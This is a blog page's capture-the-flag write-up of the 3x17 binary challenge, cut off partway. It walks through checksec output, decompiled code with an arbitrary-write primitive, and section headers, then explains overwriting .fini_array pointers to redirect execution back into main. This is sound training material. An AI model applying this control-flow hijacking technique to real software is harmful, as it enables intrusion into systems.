@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  3x17 · Lucas Ball
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Lucas Ball">
+<meta name="description" content="This challenge was relatively difficult for me and introduced a few new concepts to me. Overall a pretty good challenge I would say.
+I started out by looking at the binary information to see what&rsquo;s going on. Calling pwn checksec ./3x17 shows this:
+Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nice! No PIE and no canary. That makes it easier. Wait a second&hellip;file .">
+<meta name="keywords" content="blog,cybersecurity,infosec,personal,pwn">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="3x17"/>
+<meta name="twitter:description" content="This challenge was relatively difficult for me and introduced a few new concepts to me. Overall a pretty good challenge I would say.
+I started out by looking at the binary information to see what&rsquo;s going on. Calling pwn checksec ./3x17 shows this:
+Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nice! No PIE and no canary. That makes it easier. Wait a second&hellip;file ."/>
+
+<meta property="og:title" content="3x17" />
+<meta property="og:description" content="This challenge was relatively difficult for me and introduced a few new concepts to me. Overall a pretty good challenge I would say.
+I started out by looking at the binary information to see what&rsquo;s going on. Calling pwn checksec ./3x17 shows this:
+Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nice! No PIE and no canary. That makes it easier. Wait a second&hellip;file ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/cyber/pwnable/3x17/" /><meta property="article:section" content="cyber" />
+<meta property="article:published_time" content="2023-01-27T19:46:10-08:00" />
+<meta property="article:modified_time" content="2023-01-27T19:46:10-08:00" />
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/cyber/pwnable/3x17/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Lucas Ball
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/Cyber/">Cyber</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/mywork">My Work</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/images/resume.pdf">Resume</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/cyber/pwnable/3x17/">
+          3x17
+        </a>
+      </h1>
+    </header>
+
+    <p>This challenge was relatively difficult for me and introduced a few new concepts to me. Overall a pretty good challenge I would say.</p>
+<p>I started out by looking at the binary information to see what&rsquo;s going on. Calling <code>pwn checksec ./3x17</code> shows this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span> RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span> Stack:    No canary found
+</span></span><span style="display:flex;"><span> NX:       NX enabled
+</span></span><span style="display:flex;"><span> PIE:      No PIE <span style="color:#89dceb;font-weight:bold">(</span>0x400000<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span></code></pre></div><p>Nice! No PIE and no canary. That makes it easier. Wait a second&hellip;<code>file ./3x17</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./3x17: ELF 64-bit LSB executable,
+</span></span><span style="display:flex;"><span>x86-64, version <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux<span style="color:#89dceb;font-weight:bold">)</span>,
+</span></span><span style="display:flex;"><span>statically linked,
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">for</span> GNU/Linux 3.2.0,
+</span></span><span style="display:flex;"><span>BuildID<span style="color:#89dceb;font-weight:bold">[</span>sha1<span style="color:#89dceb;font-weight:bold">]=</span>a9f43736cc372b3d1682efa57f19a4d5c70e41d3,
+</span></span><span style="display:flex;"><span>stripped
+</span></span></code></pre></div><p>We&rsquo;re working with a stripped binary. This is gonna make it a little tough to work with. I decided to look through ghidra to figure out what was going on a little better. Taking a look at <code>entry</code> I can see that there is a function that looks a lot like <code>__libc_start_main</code> being called:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#89b4fa">FUN_00401eb0</span>(main,in_stack_00000000,<span style="color:#89dceb;font-weight:bold">&amp;</span>stack0x00000008,FUN_004028d0,FUN_00402960,param_3,auStack8)
+</span></span></code></pre></div><p>The main there was added after the fact. I know that in a call to <code>__libc_start_main</code> the first argument is always a pointer to the main function. So I decided to take a look at that function to see what it did. The next example shows the function with all the function names that I filled out as I was testing the program. But essentially the main function looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(){
+</span></span><span style="display:flex;"><span>  DAT_004b9330 <span style="color:#89dceb;font-weight:bold">=</span> DAT_004b9330 <span style="color:#89dceb;font-weight:bold">+</span> <span style="color:#a6e3a1">&#39;\x01&#39;</span>;
+</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#89dceb;font-weight:bold">=</span> DAT_004b9330;
+</span></span><span style="display:flex;"><span>  <span style="color:#cba6f7">if</span> (DAT_004b9330 <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#a6e3a1">&#39;\x01&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#89b4fa">write</span>(<span style="color:#fab387">1</span>,<span style="color:#a6e3a1">&#34;addr:&#34;</span>,<span style="color:#fab387">5</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#89b4fa">read</span>(<span style="color:#fab387">0</span>,local_28,<span style="color:#fab387">0x18</span>);
+</span></span><span style="display:flex;"><span>    addr <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">atoi</span>(local_28);
+</span></span><span style="display:flex;"><span>    <span style="color:#89b4fa">write</span>(<span style="color:#fab387">1</span>,<span style="color:#a6e3a1">&#34;data:&#34;</span>,<span style="color:#fab387">5</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#89b4fa">read</span>(<span style="color:#fab387">0</span>,(<span style="color:#f38ba8">long</span>)addr,<span style="color:#fab387">0x18</span>);
+</span></span><span style="display:flex;"><span>    cVar1 <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#a6e3a1">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>This entire function is very useful to know. Essentially what it&rsquo;s doing is reading a value that the user is able to enter then converting that value to a number. Then it will use that value as the destination of the next user input. Essentially an arbitrary write to any writeable memory. Looking at the section headers we can see what&rsquo;s writeable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#89b4fa">Section</span> <span style="color:#f9e2af">Headers</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span><span style="color:#89b4fa">Nr</span>] <span style="color:#f9e2af">Name</span>              <span style="color:#f9e2af">Type</span>             <span style="color:#f9e2af">Address</span>           <span style="color:#f9e2af">Offset</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#89b4fa">Size</span>              <span style="color:#f9e2af">EntSize</span>          <span style="color:#f9e2af">Flags</span>  <span style="color:#f9e2af">Link</span>  <span style="color:#f9e2af">Info</span>  <span style="color:#f9e2af">Align</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">0]</span>                   <span style="color:#89b4fa">NULL</span>             <span style="color:#fab387">0000000000000000</span>  <span style="color:#fab387">00000000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#f38ba8">0000000000000000</span>           <span style="color:#f38ba8">0</span>     <span style="color:#f38ba8">0</span>     <span style="color:#f38ba8">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">1]</span> <span style="color:#89b4fa">.note.ABI-tag</span>     <span style="color:#f9e2af">NOTE</span>             <span style="color:#fab387">0000000000400200</span>  <span style="color:#fab387">00000200</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000020</span>  <span style="color:#f38ba8">0000000000000000</span>   <span style="color:#89b4fa">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">2]</span> <span style="color:#89b4fa">.note.gnu.build-i</span> <span style="color:#f9e2af">NOTE</span>             <span style="color:#fab387">0000000000400220</span>  <span style="color:#fab387">00000220</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000024</span>  <span style="color:#f38ba8">0000000000000000</span>   <span style="color:#89b4fa">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">3]</span> <span style="color:#89b4fa">.rela.plt</span>         <span style="color:#f9e2af">RELA</span>             <span style="color:#fab387">0000000000400248</span>  <span style="color:#fab387">00000248</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000228</span>  <span style="color:#f38ba8">0000000000000018</span>  <span style="color:#89b4fa">AI</span>       <span style="color:#fab387">0</span>    <span style="color:#fab387">19</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">4]</span> <span style="color:#89b4fa">.init</span>             <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">0000000000401000</span>  <span style="color:#fab387">00001000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000017</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">AX</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">5]</span> <span style="color:#89b4fa">.plt</span>              <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">0000000000401018</span>  <span style="color:#fab387">00001018</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000000</span><span style="color:#89b4fa">b8</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">AX</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">6]</span> <span style="color:#89b4fa">.text</span>             <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004010</span><span style="color:#f9e2af">d0</span>  <span style="color:#fab387">000010</span><span style="color:#f9e2af">d0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">000000000008</span><span style="color:#89b4fa">b360</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">AX</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">7]</span> <span style="color:#89b4fa">__libc_freeres_fn</span> <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">000000000048</span><span style="color:#f9e2af">c430</span>  <span style="color:#fab387">0008</span><span style="color:#f9e2af">c430</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000001</span><span style="color:#89b4fa">efa</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">AX</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">16</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">8]</span> <span style="color:#89b4fa">.fini</span>             <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">000000000048</span><span style="color:#f9e2af">e32c</span>  <span style="color:#fab387">0008</span><span style="color:#f9e2af">e32c</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000009</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">AX</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[</span> <span style="color:#f38ba8">9]</span> <span style="color:#89b4fa">.rodata</span>           <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">000000000048</span><span style="color:#f9e2af">f000</span>  <span style="color:#fab387">0008</span><span style="color:#f9e2af">f000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">000000000001937</span><span style="color:#89b4fa">c</span>  <span style="color:#fab387">0000000000000000</span>   <span style="color:#f9e2af">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">32</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[10]</span> <span style="color:#89b4fa">.stapsdt.base</span>     <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">a837c</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">a837c</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000001</span>  <span style="color:#f38ba8">0000000000000000</span>   <span style="color:#89b4fa">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[11]</span> <span style="color:#89b4fa">.eh_frame</span>         <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">a8380</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">a8380</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">000000000000</span><span style="color:#89b4fa">a608</span>  <span style="color:#fab387">0000000000000000</span>   <span style="color:#f9e2af">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[12]</span> <span style="color:#89b4fa">.gcc_except_table</span> <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b2988</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b2988</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000000</span><span style="color:#89b4fa">a9</span>  <span style="color:#fab387">0000000000000000</span>   <span style="color:#f9e2af">A</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[13]</span> <span style="color:#89b4fa">.tdata</span>            <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b40c0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b30c0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000020</span>  <span style="color:#f38ba8">0000000000000000</span> <span style="color:#89b4fa">WAT</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[14]</span> <span style="color:#89b4fa">.tbss</span>             <span style="color:#f9e2af">NOBITS</span>           <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b40e0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b30e0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000040</span>  <span style="color:#f38ba8">0000000000000000</span> <span style="color:#89b4fa">WAT</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[15]</span> <span style="color:#89b4fa">.init_array</span>       <span style="color:#f9e2af">INIT_ARRAY</span>       <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b40e0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b30e0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000010</span>  <span style="color:#f38ba8">0000000000000008</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[16]</span> <span style="color:#89b4fa">.fini_array</span>       <span style="color:#f9e2af">FINI_ARRAY</span>       <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b40f0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b30f0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000010</span>  <span style="color:#f38ba8">0000000000000008</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[17]</span> <span style="color:#89b4fa">.data.rel.ro</span>      <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b4100</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b3100</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000002</span><span style="color:#89b4fa">df4</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">32</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[18]</span> <span style="color:#89b4fa">.got</span>              <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b6ef8</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b5ef8</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000000</span><span style="color:#89b4fa">f0</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[19]</span> <span style="color:#89b4fa">.got.plt</span>          <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b7000</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b6000</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000000</span><span style="color:#89b4fa">d0</span>  <span style="color:#fab387">0000000000000008</span>  <span style="color:#f9e2af">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[20]</span> <span style="color:#89b4fa">.data</span>             <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b70e0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b60e0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000001</span><span style="color:#89b4fa">af0</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">32</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[21]</span> <span style="color:#89b4fa">__libc_subfreeres</span> <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b8bd0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b7bd0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000048</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[22]</span> <span style="color:#89b4fa">__libc_IO_vtables</span> <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b8c20</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b7c20</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000006</span><span style="color:#89b4fa">a8</span>  <span style="color:#fab387">0000000000000000</span>  <span style="color:#f9e2af">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">32</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[23]</span> <span style="color:#89b4fa">__libc_atexit</span>     <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b92c8</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b82c8</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000008</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[24]</span> <span style="color:#89b4fa">.bss</span>              <span style="color:#f9e2af">NOBITS</span>           <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">b92e0</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b82d0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000001718</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">32</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[25]</span> <span style="color:#89b4fa">__libc_freeres_pt</span> <span style="color:#f9e2af">NOBITS</span>           <span style="color:#fab387">00000000004</span><span style="color:#f9e2af">ba9f8</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b82d0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000028</span>  <span style="color:#f38ba8">0000000000000000</span>  <span style="color:#89b4fa">WA</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[26]</span> <span style="color:#89b4fa">.comment</span>          <span style="color:#f9e2af">PROGBITS</span>         <span style="color:#fab387">0000000000000000</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b82d0</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000023</span>  <span style="color:#f38ba8">0000000000000001</span>  <span style="color:#89b4fa">MS</span>       <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">1</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[27]</span> <span style="color:#89b4fa">.note.stapsdt</span>     <span style="color:#f9e2af">NOTE</span>             <span style="color:#fab387">0000000000000000</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b82f4</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">00000000000010</span><span style="color:#89b4fa">c0</span>  <span style="color:#fab387">0000000000000000</span>           <span style="color:#fab387">0</span>     <span style="color:#fab387">0</span>     <span style="color:#fab387">4</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">[28]</span> <span style="color:#89b4fa">.shstrtab</span>         <span style="color:#f9e2af">STRTAB</span>           <span style="color:#fab387">0000000000000000</span>  <span style="color:#fab387">000</span><span style="color:#f9e2af">b93b4</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f38ba8">0000000000000134</span>  <span style="color:#f38ba8">0000000000000000</span>           <span style="color:#f38ba8">0</span>     <span style="color:#f38ba8">0</span>     <span style="color:#f38ba8">1</span>
+</span></span></code></pre></div><p>Looks like anything past the <code>.tdata</code> array is writeable. I thought about using the GOT, but the program doesn&rsquo;t call any other functions after getting the user input. Originally I was under the impression that the program stops immediately after the main function. What I learned is that libc has something called the <code>.init_array</code> and <code>.fini_array</code>. These are the arrays that hold the constuctors and destructors of the program. Since the constuctors have already been called so I can&rsquo;t do anything there. The destructors are called at the end of the program though so I know those haven&rsquo;t been called yet at the time of user input. I can see that that location is writable, I just need to know how <code>.fini_array</code> works. Looking at <a href="https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html"  class="external-link" target="_blank" rel="noopener">This</a> I can see that the <code>.fini_array</code> holds the pointers to two desctructor functions. I can see where they get called by looking at the functions in ghidra. The when I do that, I can check out the calling function from the calling tree. This is what that function looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">FUN_00402960</span>(<span style="color:#f38ba8">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f38ba8">long</span> lVar1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#fab387">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#cba6f7">do</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#89dceb;font-weight:bold">*</span>(code <span style="color:#89dceb;font-weight:bold">*</span>)(<span style="color:#89dceb;font-weight:bold">&amp;</span>PTR_FUN_004b40f0)[lVar1])();
+</span></span><span style="display:flex;"><span>    lVar1 <span style="color:#89dceb;font-weight:bold">=</span> lVar1 <span style="color:#89dceb;font-weight:bold">+</span> <span style="color:#89dceb;font-weight:bold">-</span><span style="color:#fab387">1</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#cba6f7">while</span> (lVar1 <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#89dceb;font-weight:bold">-</span><span style="color:#fab387">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#cba6f7">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Essentially what this is doing is taking the array at <code>PTR_FUN_004b40f0</code> and calling the pointer at <code>index 1</code>. Once the program comes back to this spot, the fucntion at <code>index 0</code> gets called which is the function that actually exits the program. If we are going to exploit this we can replace that <code>index 1</code> pointer with the address of main. With this, the <code>.fini_array</code> will go from this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;fini_array_addr&gt; : &lt;second_called_ptr&gt; &lt;first_called_ptr&gt;
+</span></span></code></pre></div><p>to this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;fini_array_addr&gt; : &lt;second_called_ptr&gt; &lt;main_func&gt;
